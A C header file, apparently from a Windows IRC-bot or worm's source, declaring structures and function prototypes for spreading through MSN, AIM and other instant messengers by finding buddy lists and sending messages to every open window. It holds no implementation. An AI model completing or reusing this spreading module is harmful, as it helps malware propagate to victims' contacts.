#ifndef NO_IM_SPREAD

typedef struct MSNSPREAD {
	PSZ pszMessage;
	BOOL bGotInfo;
} MSNSPREAD;

typedef struct IMSPREAD {
	PSZ pszMessage;
	BOOL bGotInfo;
} IMSPREAD;

typedef struct AIMSPREAD {
	PSZ pszMessage;
	BOOL bGotInfo;
} AIMSPREAD;


DWORD WINAPI initfile (void *pVoid);

DWORD WINAPI AIMSpread (void *pVoid);
HWND FindBuddyList();
void SendIM(HWND imWindow, LPCTSTR);
void IMAllWindows(LPCTSTR);
void IMAll(HWND buddyList, LPCTSTR);

DWORD WINAPI IMSpread (void *pVoid);
BOOL CALLBACK EnumMSNGRS(HWND, LPARAM);
void typetext(HWND, int, LPCTSTR);
void sendtext(int);
void activatefocus(HWND);
void cleartext();


#endif